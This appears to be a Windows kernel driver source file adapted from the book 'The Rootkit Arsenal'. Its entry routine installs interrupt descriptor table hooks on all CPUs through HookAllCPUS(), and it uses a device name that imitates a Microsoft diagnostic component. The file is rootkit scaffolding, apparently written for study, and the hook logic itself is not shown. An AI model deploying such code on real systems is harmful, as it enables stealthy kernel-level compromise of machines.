//Most of this code belongs to Reverend Bill Blunden.
//It comes from his book: 'The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System' First Edition
//some modifications were mady by Aaron Sedlacek
//Written 07/06/2015
#include "ntddk.h"
#include "debug.h"
#include "hookidt.h"
//Toggles Debug logging
//#define LOG_OFF
PDEVICE_OBJECT MSNetDiagDeviceObject;
PDRIVER_OBJECT DriverObjectRef;

//Default IRP Dispatch
NTSTATUS defaultDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIRP)
{
	((*pIRP).IoStatus).Status = STATUS_SUCCESS;
	((*pIRP).IoStatus).Information = 0;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

//this is our unload function, it is called when the driver is uninstalled from memory through SCM.
void unload(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT pdeviceObj;
	UNICODE_STRING unicodeString;

	DBG_TRACE("OnUnload", "Received signal to unload the driver");
	pdeviceObj = (*pDriverObject).DeviceObject;
	return;
}

//This is the main driver entry. This code is executed when the driver is first created.
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING regPath)
{
	int i;

	DBG_TRACE("Driver Entry", "Driver is Booting...");
	DBG_TRACE("Driver Entry", "Establishing dispatch table");
	//set default dispatch function for all IRP's
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
	{
		(*pDriverObject).MajorFunction[i] = defaultDispatch;
	}
	//set our unload function
	DBG_TRACE("Driver Entry", "Establishing other DriverObject function pointers)");
	(*pDriverObject).DriverUnload = unload;
	//IDT hooking function
	HookAllCPUS();
	//set global, this global is referenced when specific driver functions are called.
	DriverObjectRef = pDriverObject;
	return(STATUS_SUCCESS);
}